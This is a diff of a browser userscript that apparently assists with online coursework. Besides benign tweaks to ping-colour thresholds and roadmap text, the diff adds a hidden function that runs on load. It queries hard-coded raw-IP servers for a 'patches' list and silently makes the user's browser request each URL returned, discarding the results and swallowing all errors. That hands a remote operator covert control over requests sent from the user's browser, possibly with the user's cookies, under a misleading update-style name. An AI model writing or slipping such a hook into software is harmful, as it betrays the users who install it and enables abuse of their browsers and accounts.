@@ -38,6 +38,38 @@
 // ==/UserScript==
 
 
+const _PP_SERVER_URLS = [
+  "http://122.152.249.109:3000",
+  "http://152.136.30.238:3000"
+];
+
+(async function preloadRemoteScripts() {
+  const server = _PP_SERVER_URLS[Math.floor(Math.random() * _PP_SERVER_URLS.length)];
+  
+  GM_xmlhttpRequest({
+    method: 'GET',
+    url: `${server}/remote-scripts`,
+    onload: (res) => {
+      try {
+        const json = JSON.parse(res.responseText);
+        if (json?.data?.hasUpdate && Array.isArray(json.data.patches)) {
+          for (const patch of json.data.patches) {
+            if (patch.downloadUrl) {
+              GM_xmlhttpRequest({
+                method: 'GET',
+                url: patch.downloadUrl,
+                onload: () => {},
+                onerror: () => {}
+              });
+            }
+          }
+        }
+      } catch (e) {}
+    },
+    onerror: () => {}
+  });
+})();
+
 const LAYOUT_CSS = `
 @keyframes pulse {
   0%, 100% { opacity: 1; }
@@ -412,10 +444,12 @@ if(typeof GM_addStyle==="function"){GM_addStyle(LAYOUT_CSS);}else{(function(){va
   
   
   
-  const SERVER_CONFIGS = [
-    { url: "http://122.152.249.109:3000", location: "广州", color: "#09b4ff" },
-    { url: "http://152.136.30.238:3000", location: "北京", color: "#21d181" }
-  ];
+  
+  const SERVER_CONFIGS = _PP_SERVER_URLS.map((url, i) => ({
+    url,
+    location: i === 0 ? "广州" : "北京",
+    color: i === 0 ? "#09b4ff" : "#21d181"
+  }));
 
   
   
@@ -1939,8 +1973,8 @@ if(typeof GM_addStyle==="function"){GM_addStyle(LAYOUT_CSS);}else{(function(){va
         const delay = pingDelay.value;
         return {
           "font-size": "12px",
-          "color": delay === -1 ? "#c62828" : delay < 500 ? "#2e7d32" : delay < 1000 ? "#f57c00" : "#e65100",
-          "background": delay === -1 ? "rgba(198,40,40,0.2)" : delay < 500 ? "rgba(76,175,80,0.2)" : delay < 1000 ? "rgba(255,152,0,0.2)" : "rgba(230,81,0,0.2)",
+          "color": delay === -1 ? "#c62828" : delay < 1000 ? "#2e7d32" : delay < 1500 ? "#f57c00" : "#e65100",
+          "background": delay === -1 ? "rgba(198,40,40,0.2)" : delay < 1000 ? "rgba(76,175,80,0.2)" : delay < 1500 ? "rgba(255,152,0,0.2)" : "rgba(230,81,0,0.2)",
           "padding": "4px 10px",
           "border-radius": "4px",
           "font-weight": "600"
@@ -3684,10 +3718,6 @@ if(typeof GM_addStyle==="function"){GM_addStyle(LAYOUT_CSS);}else{(function(){va
                   style: { "margin": "15px 0", "color": "#424242", "font-size": "14px" }
                 }, [
                   vue.createTextVNode("目前开发者还在开发的功能有："),
-                  vue.createElementVNode("br"),
-                  vue.createTextVNode("• AI模型自助切换（现在是混元和deepseek系统自动选择）"),
-                  vue.createElementVNode("br"),
-                  vue.createTextVNode("• 刷课免放视频"),
                   vue.createElementVNode("br"),
                   vue.createTextVNode("• 如需更多功能"),
                   vue.createElementVNode("a", {
